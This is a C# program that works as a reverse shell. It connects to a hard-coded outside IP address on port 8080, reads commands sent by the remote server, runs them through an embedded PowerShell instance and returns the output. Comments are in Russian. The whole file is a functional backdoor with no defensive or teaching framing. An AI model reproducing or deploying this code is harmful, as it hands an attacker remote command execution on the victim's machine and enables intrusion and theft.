using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Numerics;
using System.Reflection;
using System.Text;
using System.Management.Automation;

public class Program
{
    public static void Main(string[] args)
    {
        int port;

        //// Получение IP
        //// Получения порта
        if (!int.TryParse("8080", out port))
        {
            Console.WriteLine("Ошибка: Неверный порт."); return;
        }
        Listen("92.124.138.136", port);
        Console.ReadLine();
    }
    protected static async void Listen(string IP, int Port)
    {
        using TcpClient tcpClient = new TcpClient();
        await tcpClient.ConnectAsync(IP, Port);
        var stream = tcpClient.GetStream();
        Console.WriteLine($"CONNECTION WITH SERVER ESTABLISHED!");

        while (tcpClient.Connected)
        {
            var response = new List<byte>();
            int bytesRead = 10; // для считывания байтов из потока
                                // считываем строку в массив байтов
                                // при отправке добавляем маркер завершения сообщения - \n
            byte[] data = Encoding.UTF8.GetBytes("<<\t CLIENT CONNECTED" + '\n');
            // отправляем данные
            await stream.WriteAsync(data);

            // считываем данные до конечного символа
            while ((bytesRead = stream.ReadByte()) != '\n')
            {
                // добавляем в буфер
                response.Add((byte)bytesRead);
            }
            var server_responce = Encoding.UTF8.GetString(response.ToArray());
            Console.WriteLine($"<< SERVER\t{server_responce}");
            response.Clear();
            // отправляем маркер завершения подключения - END
            await stream.WriteAsync(Encoding.UTF8.GetBytes($"<< CLIENT RUNS COMAND \t{server_responce}\n"));
            string execution_result = Execute(server_responce);
            await stream.WriteAsync(Encoding.UTF8.GetBytes($"<< CLIENT END COMAND\n{(string.IsNullOrEmpty(execution_result) ? "(empty output)" : execution_result)}\n"));
        }
        Console.WriteLine("CONNECTION WITH SERVER DONE");
        tcpClient.Close();
        tcpClient.Dispose();
    }
    protected static string? Execute(string command)
    {
        string buffer = null;
        using (PowerShell PowerShellInstance = PowerShell.Create())
        {
            // Добавляем скрипт или команду для запуска
            PowerShellInstance.AddScript(command);
            // Асинхронно запускаем команду
            var asyncResult = PowerShellInstance.BeginInvoke();
            // Ждём завершения команды
            while (!asyncResult.IsCompleted)
            {
                Console.WriteLine("Ожидание завершения PowerShell...");
                System.Threading.Thread.Sleep(1000);
            }
            Console.WriteLine("Команда завершена.");
            // Получаем результаты команды
            foreach (PSObject result in PowerShellInstance.EndInvoke(asyncResult))
            {
                buffer += "POWERSHELL >> " + result.ToString() + "\n";
                Console.WriteLine(buffer);
            }
        }
        return buffer;
    }
}